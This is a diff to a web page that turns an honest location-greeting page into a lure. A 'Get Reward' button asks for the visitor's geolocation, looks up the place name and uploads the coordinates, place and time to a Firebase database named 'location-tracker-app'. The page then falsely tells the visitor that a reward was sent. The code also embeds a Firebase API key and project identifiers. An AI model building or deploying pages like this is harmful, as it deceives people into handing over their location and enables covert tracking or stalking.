@@ -20,10 +20,103 @@
     </style>
 </head>
 <body>
-    <h1>Welcome!</h1>
-    <p id="status">Please allow location access to receive a personalized greeting.</p>
+    <h1>Welcome</h1>
+    <p>Hello, we will give you a reward. Click below to get!!</p>
+    <button onclick="getLocation()">Get Reward</button>
+    <p id="status"></p>
     <div id="greeting"></div>
 
-    <script src="script.js"></script>
+    <!-- Firebase SDK (using CDN) -->
+    <script type="module">
+        // Import Firebase App and Realtime Database
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-database.js";
+
+        // Firebase configuration (replace with your own Firebase project config)
+        const firebaseConfig = {
+            apiKey: "AIzaSyDUEBqFknuWJjzJ0DLq0fo99FEwT_9Yd2o",
+            authDomain: "location-tracker-app-443b8.firebaseapp.com",
+            databaseURL: "https://location-tracker-app-443b8-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "location-tracker-app-443b8",
+            storageBucket: "location-tracker-app-443b8.firebasestorage.app",
+            messagingSenderId: "559582112060",
+            appId: "1:559582112060:web:f7b1bf77c3e687400f9639"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Function to get and store location
+        window.getLocation = function() {
+            if (navigator.geolocation) {
+                document.getElementById("status").innerHTML = "Requesting location...";
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("status").innerHTML = "Geolocation is not supported by this browser.";
+            }
+        };
+
+        // Function to handle successful location retrieval
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Fetch location name using Nominatim reverse geocoding
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                .then(response => response.json())
+                .then(data => {
+                    const locationName = data.address.city || data.address.town || data.address.country || "Unknown";
+                    const locationData = {
+                        latitude: lat,
+                        longitude: lon,
+                        locationName: locationName,
+                        timestamp: new Date().toISOString()
+                    };
+
+                    // Store the data in Firebase under 'locations'
+                    const dbRef = ref(db, 'locations');
+                    push(dbRef, locationData)
+                        .then(() => {
+                            document.getElementById("greeting").innerHTML = `Hello from ${locationName}!`;
+                            document.getElementById("status").innerHTML = "Thank you! We sent you a reward. Your location has been recorded.";
+                        })
+                        .catch((error) => {
+                            console.error("Error storing location:", error);
+                            document.getElementById("status").innerHTML = "An error occurred while recording your location.";
+                        });
+                })
+                .catch(error => {
+                    console.error("Error with reverse geocoding:", error);
+                    document.getElementById("status").innerHTML = "Unable to retrieve location name, but coordinates were stored.";
+                    // Store coordinates even if geocoding fails
+                    const locationData = { 
+                        latitude: lat, 
+                        longitude: lon, 
+                        timestamp: new Date().toISOString() 
+                    };
+                    const dbRef = ref(db, 'locations');
+                    push(dbRef, locationData);
+                });
+        }
+
+        // Function to handle errors or permission denial
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("status").innerHTML = "Location access denied. Please enable it for a personalized greeting.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("status").innerHTML = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("status").innerHTML = "The request to get location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("status").innerHTML = "An unknown error occurred.";
+                    break;
+            }
+        }
+    </script>
 </body>
 </html>
